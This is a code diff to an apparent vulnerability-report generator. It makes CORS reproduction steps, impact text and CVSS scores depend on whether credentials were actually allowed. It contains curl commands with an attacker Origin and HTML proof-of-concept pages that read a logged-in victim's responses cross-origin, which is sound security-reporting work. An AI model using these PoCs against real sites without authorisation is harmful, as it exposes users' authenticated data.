@@ -911,6 +911,24 @@ def _jwt_forge_poc(pe: dict[str, Any]) -> str:
     )
 
 
+def _cors_allow_credentials_header(pe: dict[str, Any]) -> str:
+    """The captured ``Access-Control-Allow-Credentials`` header, or '' when the target returned none."""
+    for part in str((pe or {}).get("matched_value") or "").split(";"):
+        if "allow-credentials" in part.lower():
+            return part.strip()
+    return ""
+
+
+def _cors_is_credentialed(pe: dict[str, Any]) -> bool:
+    """True only when the CAPTURED evidence shows ``Allow-Credentials: true``.
+
+    ONE definition, because three parts of the same submission answer this question and used to
+    answer it differently: the reproduction steps, the PoC, and the impact/CVSS narrative. A single
+    predicate is what keeps the Impact paragraph from promising an authenticated cross-origin read
+    on the page after the steps say no credentials were returned."""
+    return _cors_allow_credentials_header(pe).lower().rstrip().endswith("true")
+
+
 def _cors_concrete_repro(finding: dict[str, Any], url: str, pe: dict[str, Any]) -> tuple[list[str], str]:
     """CORS's bespoke reproduction: the precise credentialed cross-origin request, the ACAO /
     Allow-Credentials headers as distinct headers, and a PoC page that actually reads the
@@ -932,36 +950,81 @@ def _cors_concrete_repro(finding: dict[str, Any], url: str, pe: dict[str, Any]) 
     hdr_parts = [h.strip() for h in matched.split(";") if h.strip()]
     acao = next((h for h in hdr_parts if h.lower().startswith("access-control-allow-origin")),
                 f"Access-Control-Allow-Origin: {origin}")
-    acac = next((h for h in hdr_parts if "allow-credentials" in h.lower()),
-                "Access-Control-Allow-Credentials: true")
+    # Did the target ACTUALLY return Allow-Credentials: true? The prover emits a separate
+    # "reflects arbitrary Origin (no credentials)" finding for the case where it did not, so the
+    # repro must not paper over the difference. It used to: the header fell back to a hard-coded
+    # "Access-Control-Allow-Credentials: true" and step 3 then told the triager to OBSERVE a header
+    # the engine had proved absent, with steps 4-5 building a credentialed-read impact on top of it.
+    # A triager who follows that, sees no such header, and finds the PoC read nothing closes the
+    # report as invalid — and rightly.
+    acac = _cors_allow_credentials_header(pe)
+    credentialed = _cors_is_credentialed(pe)
     # Single-line steps (normalize_steps splits on newline, so keep each on one line).
     curl = f"curl -i -H 'Origin: {origin}' -H 'Cookie: <YOUR authenticated session cookie>' '{url}'"
-    steps = [
-        "Log in to the target as a normal user and copy your session cookie / Authorization header from the browser devtools Network tab.",
-        f"From an origin you control (not the target), replay the request with an attacker Origin plus your credentials: `{curl}`",
-        f"Observe that the response reflects the attacker Origin and permits credentials — the misconfiguration: `{acao}` together with `{acac}`.",
-        "Because credentials are allowed for a reflected/untrusted Origin, a page on the attacker origin can read the authenticated response. Save the Proof of concept below as an .html file, host it on an origin you control, and open it in a browser that is logged in to the target.",
-        "The PoC performs a credentialed `fetch(..., {credentials:'include'})` and prints the victim's authenticated response body — that readable cross-origin data is the demonstrated impact.",
-    ]
-    poc = (
-        "<!doctype html>\n"
-        "<meta charset=\"utf-8\">\n"
-        "<title>CORS PoC — cross-origin read with victim credentials</title>\n"
-        f"<h3>CORS PoC: reading {url} cross-origin with the victim's credentials</h3>\n"
-        "<p>Open this page (hosted on an attacker-controlled origin) in a browser logged in to the target.</p>\n"
-        "<pre id=\"out\">running…</pre>\n"
-        "<script>\n"
-        f"fetch({json.dumps(url)}, {{ credentials: \"include\" }})\n"
-        "  .then(function (r) { return r.text(); })\n"
-        "  .then(function (body) {\n"
-        "    document.getElementById(\"out\").textContent =\n"
-        "      \"VULNERABLE — read \" + body.length + \" bytes of the victim's authenticated response cross-origin:\\n\\n\" + body;\n"
-        "  })\n"
-        "  .catch(function (e) {\n"
-        "    document.getElementById(\"out\").textContent = \"Not vulnerable / blocked by the browser: \" + e;\n"
-        "  });\n"
-        "</script>\n"
-    )
+    if credentialed:
+        steps = [
+            "Log in to the target as a normal user and copy your session cookie / Authorization header from the browser devtools Network tab.",
+            f"From an origin you control (not the target), replay the request with an attacker Origin plus your credentials: `{curl}`",
+            f"Observe that the response reflects the attacker Origin and permits credentials — the misconfiguration: `{acao}` together with `{acac}`.",
+            "Because credentials are allowed for a reflected/untrusted Origin, a page on the attacker origin can read the authenticated response. Save the Proof of concept below as an .html file, host it on an origin you control, and open it in a browser that is logged in to the target.",
+            "The PoC performs a credentialed `fetch(..., {credentials:'include'})` and prints the victim's authenticated response body — that readable cross-origin data is the demonstrated impact.",
+        ]
+    else:
+        # Reflection only. State exactly what was captured, and name the missing precondition
+        # rather than asserting impact the evidence does not support.
+        steps = [
+            f"From an origin you control (not the target), replay the request with an attacker Origin: `curl -i -H 'Origin: {origin}' '{url}'`",
+            f"Observe that the response reflects the attacker Origin back: `{acao}`.",
+            "Confirm what was NOT observed: the response carries no `Access-Control-Allow-Credentials: true`, so a browser will not attach or expose the victim's credentials on this cross-origin read.",
+            "Assess reachable impact before reporting: reflection alone exposes only data the endpoint already serves unauthenticated. Check whether this endpoint returns anything sensitive without a session, or whether another route on the same origin reflects the Origin AND allows credentials.",
+            "Report as a reflected-Origin misconfiguration, not as an authenticated cross-origin read, unless you can capture the credentialed variant.",
+        ]
+    if credentialed:
+        poc = (
+            "<!doctype html>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title>CORS PoC — cross-origin read with victim credentials</title>\n"
+            f"<h3>CORS PoC: reading {url} cross-origin with the victim's credentials</h3>\n"
+            "<p>Open this page (hosted on an attacker-controlled origin) in a browser logged in to the target.</p>\n"
+            "<pre id=\"out\">running…</pre>\n"
+            "<script>\n"
+            f"fetch({json.dumps(url)}, {{ credentials: \"include\" }})\n"
+            "  .then(function (r) { return r.text(); })\n"
+            "  .then(function (body) {\n"
+            "    document.getElementById(\"out\").textContent =\n"
+            "      \"VULNERABLE — read \" + body.length + \" bytes of the victim's authenticated response cross-origin:\\n\\n\" + body;\n"
+            "  })\n"
+            "  .catch(function (e) {\n"
+            "    document.getElementById(\"out\").textContent = \"Not vulnerable / blocked by the browser: \" + e;\n"
+            "  });\n"
+            "</script>\n"
+        )
+    else:
+        # No Allow-Credentials was observed, so a credentialed fetch would be a claim, not a
+        # demonstration. Show the reflection that WAS captured and say plainly what it does and
+        # does not prove.
+        poc = (
+            "<!doctype html>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title>CORS PoC — reflected Origin (unauthenticated cross-origin read)</title>\n"
+            f"<h3>CORS PoC: {url} reflects an attacker Origin</h3>\n"
+            "<p>Open this page on an origin you control. The target returned no "
+            "<code>Access-Control-Allow-Credentials: true</code>, so this reads only what the "
+            "endpoint serves WITHOUT a session — it is not an authenticated cross-origin read.</p>\n"
+            "<pre id=\"out\">running…</pre>\n"
+            "<script>\n"
+            f"fetch({json.dumps(url)})\n"
+            "  .then(function (r) { return r.text(); })\n"
+            "  .then(function (body) {\n"
+            "    document.getElementById(\"out\").textContent =\n"
+            "      \"Reflected Origin allowed an UNAUTHENTICATED cross-origin read of \" + body.length +\n"
+            "      \" bytes. Assess whether this data is sensitive:\\n\\n\" + body;\n"
+            "  })\n"
+            "  .catch(function (e) {\n"
+            "    document.getElementById(\"out\").textContent = \"Blocked by the browser: \" + e;\n"
+            "  });\n"
+            "</script>\n"
+        )
     return steps, poc
 
 
@@ -1262,6 +1325,38 @@ def _deterministic_attack_plan(finding: dict[str, Any], class_id: str) -> dict[s
         steps = concrete_steps
 
     model = impact_model.impact_for_class(class_id)
+    # A CORS finding whose captured evidence shows NO Allow-Credentials is a different bug from the
+    # one the cors impact model describes. The model speaks throughout of reading AUTHENTICATED
+    # responses with the victim's credentials, and its proof obligation demands a credentialed
+    # browser PoC — so leaving it in place put an Impact paragraph, an affected asset, a proof
+    # obligation and a CVSS justification in the same submission that all contradict the
+    # reproduction steps two sections above, and re-asserted exactly the unsupported claim the
+    # reflection-only steps exist to drop. Restate the model for what was actually captured.
+    _cors_reflection_only = (
+        class_id == "cors"
+        and not _cors_is_credentialed(finding.get("proof_evidence") if isinstance(finding.get("proof_evidence"), dict) else {})
+    )
+    if _cors_reflection_only:
+        model = dict(model)
+        model["attacker_capability"] = (
+            "An attacker-controlled page can read this endpoint's response cross-origin because the "
+            "target reflects its Origin. No Access-Control-Allow-Credentials was returned, so the "
+            "read is UNAUTHENTICATED — it reaches only what the endpoint already serves without a session."
+        )
+        model["affected_asset"] = (
+            "whatever this endpoint returns to an unauthenticated caller; no authenticated response is "
+            "reachable through this finding as captured."
+        )
+        model["business_impact"] = (
+            "cross-origin reading of unauthenticated responses — informational unless this endpoint "
+            "serves sensitive data without a session, or another route on the same origin reflects the "
+            "Origin AND allows credentials."
+        )
+        model["proof_obligation"] = (
+            "Capture what this endpoint returns to an unauthenticated cross-origin read and show that "
+            "data is sensitive — or find a route on the same origin that reflects the Origin WITH "
+            "`Allow-Credentials: true` and prove the authenticated read there. Reflection alone is not impact."
+        )
     impact_text = (
         f"{model['attacker_capability']} "
         f"Affected asset: {model['affected_asset']} "
@@ -1309,6 +1404,30 @@ def _deterministic_attack_plan(finding: dict[str, Any], class_id: str) -> dict[s
                 "Use only one read-only issuer request. Do not perform writes, enumeration, prompt submission, or data extraction."
             )
     cvss = impact_model.cvss_for_class(class_id)
+    # Same reasoning as the impact text above, applied to the vector: the modelled cors C:L estimates
+    # a cross-origin read of AUTHENTICATED data, which this finding's evidence does not support.
+    # Recompute the whole vector rather than only the justification, so score, vector and 'why' agree
+    # — the pattern the secrets branch below already establishes. C:N scores 0.0, which
+    # resolve_severity deliberately does NOT treat as a severity tier, so the finding's own severity
+    # (what the prover assigned to the no-credentials variant) governs instead of a modelled claim.
+    if _cors_reflection_only and isinstance(cvss, dict):
+        _refl_vector = "/".join(
+            ("C:N" if part.upper().startswith("C:") else part)
+            for part in str(cvss.get("vector") or "").split("/")
+        )
+        _refl_scored = impact_model.cvss_base_score(_refl_vector)["score"]
+        cvss = {
+            **cvss,
+            "vector": _refl_vector,
+            "base_score": _refl_scored,
+            "base_severity": impact_model.cvss_severity(_refl_scored),
+            "justification": (
+                "Origin reflection was captured without Allow-Credentials, so no authenticated "
+                "cross-origin read is demonstrated: confidentiality impact is scored N until the "
+                "operator shows the unauthenticated response carries sensitive data."
+            ),
+            "estimated": True,
+        }
     # An UNPROVEN exposed secret (public client key / unverified candidate) must not carry the
     # secrets-class High CVSS: resolve_severity lets a plan CVSS base_severity win over the finding's
     # own (already-downgraded) severity, which would silently re-inflate it. Cap the CVSS base_severity
